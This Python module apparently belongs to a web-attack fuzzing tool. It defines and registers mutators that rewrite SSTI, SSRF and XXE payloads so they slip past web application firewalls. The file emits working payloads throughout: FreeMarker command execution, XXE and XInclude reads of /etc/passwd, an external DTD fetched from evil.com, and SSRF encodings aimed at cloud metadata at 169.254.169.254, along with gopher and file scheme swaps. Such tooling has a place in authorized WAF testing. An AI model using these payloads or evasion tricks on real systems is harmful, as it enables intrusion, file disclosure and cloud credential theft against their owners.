"""Class-specific mutators for SSTI, SSRF, and XXE.

These classes have seeds in the KB but previously relied on the 43 generic
mutators only. Dedicated mutators encode payloads in ways that exploit
class-specific parser behaviour (template engines, URL parsers, XML parsers)
while breaking WAF signature matching.
"""
from __future__ import annotations

import re
import struct

from .base import REGISTRY

_SSTI = {"SSTI"}
_SSRF = {"SSRF"}
_XXE = {"XXE Injection"}

# ---------------------------------------------------------------------------
# SSTI mutators
# ---------------------------------------------------------------------------

_TEMPLATE_DELIM_RE = re.compile(r"\{\{(.+?)\}\}", re.DOTALL)
_DOLLAR_BRACE_RE = re.compile(r"\$\{(.+?)\}", re.DOTALL)
_ERB_RE = re.compile(r"<%=\s*(.+?)\s*%>", re.DOTALL)
_HASH_BRACE_RE = re.compile(r"#\{(.+?)\}", re.DOTALL)


def ssti_jinja2_attr_access(s: str) -> str:
    """Rewrite dot-access to Jinja2 |attr() filter: `config` → `()|attr('__class__')`."""
    s = s.replace(".__class__", "|attr('__class__')")
    s = s.replace(".__mro__", "|attr('__mro__')")
    s = s.replace(".__subclasses__", "|attr('__subclasses__')")
    s = s.replace(".__init__", "|attr('__init__')")
    s = s.replace(".__globals__", "|attr('__globals__')")
    s = s.replace(".__builtins__", "|attr('__builtins__')")
    return s


def ssti_jinja2_filter_chain(s: str) -> str:
    """Build dunder strings via Jinja2 filter concat: `__class__` → `'__cla'~'ss__'`."""
    dunders = [
        ("__class__", "'__cla'~'ss__'"),
        ("__mro__", "'__mr'~'o__'"),
        ("__subclasses__", "'__subcla'~'sses__'"),
        ("__init__", "'__in'~'it__'"),
        ("__globals__", "'__glob'~'als__'"),
        ("__builtins__", "'__built'~'ins__'"),
        ("__import__", "'__impo'~'rt__'"),
    ]
    out = s
    for orig, repl in dunders:
        out = out.replace(orig, repl)
    return out


def ssti_jinja2_string_concat(s: str) -> str:
    """Split string literals inside {{...}} using Jinja2 ~ concat operator."""
    def split_inner(m: re.Match) -> str:
        inner = m.group(1)
        parts = re.findall(r"'([^']+)'", inner)
        if not parts:
            return m.group(0)
        rebuilt = inner
        for p in parts:
            if len(p) >= 4:
                mid = len(p) // 2
                rebuilt = rebuilt.replace(f"'{p}'", f"'{p[:mid]}'~'{p[mid:]}'", 1)
        return "{{" + rebuilt + "}}"
    return _TEMPLATE_DELIM_RE.sub(split_inner, s)


def ssti_twig_syntax(s: str) -> str:
    """Convert Jinja2-style probes to Twig equivalents."""
    out = s
    out = out.replace("{{7*7}}", "{{7*'7'}}")
    out = out.replace("{{config}}", "{{dump()}}")
    out = out.replace("{{self.__class__}}", "{{_self.env}}")
    return out


def ssti_freemarker(s: str) -> str:
    """Convert generic SSTI probes to FreeMarker template syntax."""
    out = s
    out = out.replace("{{7*7}}", "${7*7}")
    out = out.replace("${7*7}", '<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}')
    return out


def ssti_generic_math_probe(s: str) -> str:
    """Emit multi-engine math probes from a single seed."""
    if "7*7" not in s:
        return s
    variants = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{7*'7'}}",
                "${{7*7}}", "{7*7}", "{{7**7}}"]
    for v in variants:
        if v in s:
            return s
    return "{{7*7}} ${7*7} <%= 7*7 %> #{7*7}"


def ssti_unicode_escape(s: str) -> str:
    """Encode template delimiters as unicode escapes."""
    out = s
    out = out.replace("{{", "\\u007b\\u007b")
    out = out.replace("}}", "\\u007d\\u007d")
    out = out.replace("${", "\\u0024\\u007b")
    out = out.replace("<%", "\\u003c\\u0025")
    out = out.replace("%>", "\\u0025\\u003e")
    return out


def ssti_comment_break(s: str) -> str:
    """Prepend a Jinja2 comment block to confuse WAF state tracking."""
    if "{{" in s:
        return s.replace("{{", "{#x#}{{", 1)
    return "{#x#}" + s


def ssti_hex_encode_strings(s: str) -> str:
    """Hex-encode string arguments inside template expressions."""
    def hex_str(m: re.Match) -> str:
        literal = m.group(1)
        hex_chars = "".join(f"\\x{ord(c):02x}" for c in literal)
        return f"'{hex_chars}'"
    return re.sub(r"'([a-zA-Z_][a-zA-Z0-9_]*)'", hex_str, s)


def ssti_request_object(s: str) -> str:
    """Use Jinja2 request object to access globals indirectly."""
    out = s
    out = out.replace("config", "request.application.__self__._get_data_for_json.__code__")
    return out


# ---------------------------------------------------------------------------
# SSRF mutators
# ---------------------------------------------------------------------------

_IPV4_RE = re.compile(r"\b(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})\b")


def _ip_to_int(a: int, b: int, c: int, d: int) -> int:
    return (a << 24) | (b << 16) | (c << 8) | d


def ssrf_ip_decimal(s: str) -> str:
    """Convert dotted IPv4 to decimal integer: `127.0.0.1` → `2130706433`."""
    def repl(m: re.Match) -> str:
        parts = [int(m.group(i)) for i in range(1, 5)]
        return str(_ip_to_int(*parts))
    return _IPV4_RE.sub(repl, s)


def ssrf_ip_octal(s: str) -> str:
    """Convert each IPv4 octet to octal: `127.0.0.1` → `0177.0.0.01`."""
    def repl(m: re.Match) -> str:
        parts = [int(m.group(i)) for i in range(1, 5)]
        return ".".join(f"0{oct(p)[2:]}" for p in parts)
    return _IPV4_RE.sub(repl, s)


def ssrf_ip_hex(s: str) -> str:
    """Convert IPv4 to hex integer: `127.0.0.1` → `0x7f000001`."""
    def repl(m: re.Match) -> str:
        parts = [int(m.group(i)) for i in range(1, 5)]
        return f"0x{_ip_to_int(*parts):08x}"
    return _IPV4_RE.sub(repl, s)


def ssrf_ip_ipv6_mapped(s: str) -> str:
    """Convert IPv4 to IPv6-mapped: `127.0.0.1` → `[::ffff:127.0.0.1]`."""
    def repl(m: re.Match) -> str:
        return f"[::ffff:{m.group(0)}]"
    return _IPV4_RE.sub(repl, s)


def ssrf_ip_short(s: str) -> str:
    """Use short IPv4 forms: `127.0.0.1` → `127.1`, `0.0.0.0` → `0`."""
    out = s
    out = out.replace("127.0.0.1", "127.1")
    out = out.replace("0.0.0.0", "0")
    return out


def ssrf_url_double_encode(s: str) -> str:
    """Double URL-encode the scheme+authority: `http://` → `http%3A%2F%2F`."""
    out = s
    out = out.replace("http://", "http%3A%2F%2F")
    out = out.replace("https://", "https%3A%2F%2F")
    return out


def ssrf_dns_rebind(s: str) -> str:
    """Replace IPs with DNS rebinding services: `127.0.0.1` → `127.0.0.1.nip.io`."""
    out = s
    out = out.replace("127.0.0.1", "127.0.0.1.nip.io")
    out = out.replace("169.254.169.254", "169.254.169.254.nip.io")
    return out


def ssrf_redirect_bypass(s: str) -> str:
    """Use URL authority confusion: `http://127.0.0.1` → `http://attacker@127.0.0.1`."""
    out = s
    out = out.replace("http://127.0.0.1", "http://a@127.0.0.1")
    out = out.replace("http://169.254.169.254", "http://a@169.254.169.254")
    out = out.replace("https://", "https://a@", 1)
    return out


def ssrf_scheme_variation(s: str) -> str:
    """Cycle HTTP URLs through alternative schemes."""
    if "http://" in s:
        return s.replace("http://", "gopher://", 1)
    if "https://" in s:
        return s.replace("https://", "gopher://", 1)
    return s


def ssrf_scheme_file(s: str) -> str:
    """Convert HTTP SSRF to file:// scheme for local file read."""
    if "http://169.254.169.254" in s:
        return s.replace("http://169.254.169.254", "file://")
    if "http://127.0.0.1" in s:
        return s.replace("http://127.0.0.1", "file://")
    return "file:///etc/passwd"


def ssrf_cloud_metadata(s: str) -> str:
    """Encode cloud metadata IP in alternative forms."""
    out = s
    out = out.replace("169.254.169.254", "0xa9fea9fe")
    return out


def ssrf_url_fragment(s: str) -> str:
    """Use URL fragment to confuse URL parsers."""
    if "http://" in s:
        return re.sub(r"(https?://)", r"\1evil.com#@", s, count=1)
    return s


def ssrf_localhost_alternatives(s: str) -> str:
    """Replace localhost/127.0.0.1 with alternative representations."""
    out = s
    out = out.replace("127.0.0.1", "localtest.me")
    out = out.replace("localhost", "localtest.me")
    return out


# ---------------------------------------------------------------------------
# XXE mutators
# ---------------------------------------------------------------------------

_DOCTYPE_RE = re.compile(r"<!DOCTYPE\s+\w+\s*\[", re.IGNORECASE)
_ENTITY_RE = re.compile(
    r"<!ENTITY\s+(\w+)\s+SYSTEM\s+\"([^\"]+)\"\s*>", re.IGNORECASE
)


def xxe_parameter_entity(s: str) -> str:
    """Convert general entity to parameter entity: `<!ENTITY x ...>` → `<!ENTITY % x ...>`."""
    out = re.sub(
        r"<!ENTITY\s+(\w+)\s+SYSTEM",
        r"<!ENTITY % \1 SYSTEM",
        s, flags=re.IGNORECASE,
    )
    out = re.sub(r"&(\w+);", r"%\1;", out)
    return out


def xxe_dtd_external(s: str) -> str:
    """Replace inline DTD with external DTD reference."""
    if "<!DOCTYPE" in s.upper():
        return re.sub(
            r"<!DOCTYPE\s+\w+\s*\[.*?\]>",
            '<!DOCTYPE foo SYSTEM "http://evil.com/xxe.dtd">',
            s, flags=re.IGNORECASE | re.DOTALL,
        )
    return '<!DOCTYPE foo SYSTEM "http://evil.com/xxe.dtd">' + s


def xxe_cdata_wrap(s: str) -> str:
    """Wrap entity references in CDATA concatenation."""
    return s.replace("&xxe;", "<![CDATA[&xxe;]]>")


def xxe_encoding_declaration(s: str) -> str:
    """Change XML encoding declaration to UTF-16 to confuse parsers."""
    if '<?xml' in s.lower():
        return re.sub(
            r'<\?xml\s+version="[^"]*"\s*\?>',
            '<?xml version="1.0" encoding="UTF-16"?>',
            s, flags=re.IGNORECASE,
        )
    return '<?xml version="1.0" encoding="UTF-16"?>' + s


def xxe_xinclude(s: str) -> str:
    """Inject XInclude instead of DTD-based XXE."""
    return (
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
        '<xi:include parse="text" href="file:///etc/passwd"/>'
        '</foo>'
    )


def xxe_svg_wrapper(s: str) -> str:
    """Embed XXE payload inside an SVG container."""
    inner = s
    if '<?xml' in s.lower():
        inner = re.sub(r'<\?xml[^?]*\?>', '', s, flags=re.IGNORECASE).strip()
    # Extract the DTD if present, otherwise use a default one
    dtd_match = re.search(r'(<!DOCTYPE\s+\w+\s*\[.*?\]>)', inner, re.IGNORECASE | re.DOTALL)
    if dtd_match:
        dtd = dtd_match.group(1).replace("<!DOCTYPE foo", "<!DOCTYPE svg")
        return (
            '<?xml version="1.0"?>'
            f'{dtd}'
            '<svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>'
        )
    return (
        '<?xml version="1.0"?>'
        '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>'
    )


def xxe_comment_obfuscate(s: str) -> str:
    """Insert XML comments inside DTD to break WAF pattern matching."""
    out = s
    out = out.replace("<!ENTITY", "<!-- xxe --><!ENTITY")
    out = out.replace("SYSTEM", "<!-- s -->SYSTEM")
    return out


def xxe_nested_entity(s: str) -> str:
    """Use a nested entity that references another entity."""
    return (
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo ['
        '<!ENTITY a SYSTEM "file:///etc/passwd">'
        '<!ENTITY b "&a;">'
        ']><foo>&b;</foo>'
    )


def xxe_utf7_encoding(s: str) -> str:
    """Declare UTF-7 encoding in XML prolog."""
    if '<?xml' in s.lower():
        return re.sub(
            r'<\?xml\s+version="[^"]*"\s*\?>',
            '<?xml version="1.0" encoding="UTF-7"?>',
            s, flags=re.IGNORECASE,
        )
    return '<?xml version="1.0" encoding="UTF-7"?>' + s


# ---------------------------------------------------------------------------
# Registration
# ---------------------------------------------------------------------------

def _register() -> None:
    R = REGISTRY

    # SSTI
    R.add("ssti_jinja2_attr_access", ssti_jinja2_attr_access, "obfuscator",
          "dot-access → Jinja2 |attr() filter chain", classes=_SSTI)
    R.add("ssti_jinja2_filter_chain", ssti_jinja2_filter_chain, "obfuscator",
          "dunder strings → Jinja2 '~' concat fragments", classes=_SSTI)
    R.add("ssti_jinja2_string_concat", ssti_jinja2_string_concat, "obfuscator",
          "split string literals inside {{}} via ~ concat", classes=_SSTI)
    R.add("ssti_twig_syntax", ssti_twig_syntax, "obfuscator",
          "Jinja2 probes → Twig equivalents (7*'7', dump())", classes=_SSTI)
    R.add("ssti_freemarker", ssti_freemarker, "obfuscator",
          "generic probes → FreeMarker Execute?new() syntax", classes=_SSTI)
    R.add("ssti_generic_math_probe", ssti_generic_math_probe, "obfuscator",
          "emit multi-engine math probes from single seed", classes=_SSTI)
    R.add("ssti_unicode_escape", ssti_unicode_escape, "encoder",
          "template delimiters → \\uXXXX escapes", classes=_SSTI)
    R.add("ssti_comment_break", ssti_comment_break, "obfuscator",
          "prepend Jinja2 {#comment#} to break WAF state", classes=_SSTI)
    R.add("ssti_hex_encode_strings", ssti_hex_encode_strings, "encoder",
          "hex-encode string arguments inside template expressions", classes=_SSTI)
    R.add("ssti_request_object", ssti_request_object, "obfuscator",
          "access globals via Jinja2 request object", classes=_SSTI)

    # SSRF
    R.add("ssrf_ip_decimal", ssrf_ip_decimal, "encoder",
          "IPv4 → decimal integer (127.0.0.1 → 2130706433)", classes=_SSRF)
    R.add("ssrf_ip_octal", ssrf_ip_octal, "encoder",
          "IPv4 octets → octal (127.0.0.1 → 0177.0.0.01)", classes=_SSRF)
    R.add("ssrf_ip_hex", ssrf_ip_hex, "encoder",
          "IPv4 → hex integer (127.0.0.1 → 0x7f000001)", classes=_SSRF)
    R.add("ssrf_ip_ipv6_mapped", ssrf_ip_ipv6_mapped, "encoder",
          "IPv4 → [::ffff:x.x.x.x] IPv6-mapped", classes=_SSRF)
    R.add("ssrf_ip_short", ssrf_ip_short, "encoder",
          "IPv4 short form (127.0.0.1 → 127.1)", classes=_SSRF)
    R.add("ssrf_url_double_encode", ssrf_url_double_encode, "encoder",
          "double URL-encode scheme+authority", classes=_SSRF)
    R.add("ssrf_dns_rebind", ssrf_dns_rebind, "obfuscator",
          "IP → DNS rebinding service (nip.io)", classes=_SSRF)
    R.add("ssrf_redirect_bypass", ssrf_redirect_bypass, "obfuscator",
          "URL authority confusion via @ (attacker@target)", classes=_SSRF)
    R.add("ssrf_scheme_variation", ssrf_scheme_variation, "obfuscator",
          "http:// → gopher:// scheme swap", classes=_SSRF)
    R.add("ssrf_scheme_file", ssrf_scheme_file, "obfuscator",
          "http:// → file:// for local file read", classes=_SSRF)
    R.add("ssrf_cloud_metadata", ssrf_cloud_metadata, "encoder",
          "cloud metadata IP → hex (169.254.169.254 → 0xa9fea9fe)", classes=_SSRF)
    R.add("ssrf_url_fragment", ssrf_url_fragment, "obfuscator",
          "URL fragment confusion (evil.com#@target)", classes=_SSRF)
    R.add("ssrf_localhost_alternatives", ssrf_localhost_alternatives, "obfuscator",
          "localhost/127.0.0.1 → localtest.me", classes=_SSRF)

    # XXE
    R.add("xxe_parameter_entity", xxe_parameter_entity, "obfuscator",
          "general entity → parameter entity (% prefix)", classes=_XXE)
    R.add("xxe_dtd_external", xxe_dtd_external, "obfuscator",
          "inline DTD → external DTD reference", classes=_XXE)
    R.add("xxe_cdata_wrap", xxe_cdata_wrap, "obfuscator",
          "entity ref → CDATA section wrapper", classes=_XXE)
    R.add("xxe_encoding_declaration", xxe_encoding_declaration, "encoder",
          "XML prolog → UTF-16 encoding to confuse parser", classes=_XXE)
    R.add("xxe_xinclude", xxe_xinclude, "obfuscator",
          "DTD-based XXE → XInclude variant", classes=_XXE)
    R.add("xxe_svg_wrapper", xxe_svg_wrapper, "obfuscator",
          "XXE payload wrapped inside SVG container", classes=_XXE)
    R.add("xxe_comment_obfuscate", xxe_comment_obfuscate, "obfuscator",
          "XML comments inside DTD to break WAF pattern", classes=_XXE)
    R.add("xxe_nested_entity", xxe_nested_entity, "obfuscator",
          "nested entity referencing another entity", classes=_XXE)
    R.add("xxe_utf7_encoding", xxe_utf7_encoding, "encoder",
          "XML prolog → UTF-7 encoding declaration", classes=_XXE)


_register()
